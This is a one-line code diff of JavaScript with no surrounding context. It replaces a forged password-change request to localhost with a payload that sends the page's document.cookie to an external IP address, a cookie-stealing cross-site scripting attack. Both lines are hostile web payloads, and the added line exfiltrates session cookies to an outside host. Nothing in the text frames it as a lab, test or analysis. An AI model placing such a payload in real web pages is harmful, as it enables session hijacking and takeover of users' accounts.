@@ -1,1 +1,1 @@
-fetch("http://localhost/changePassword", "username=Daniel&newPassword=passwordtest123")
+fetch("http://100.79.202.74/cookie?" + document.cookie)
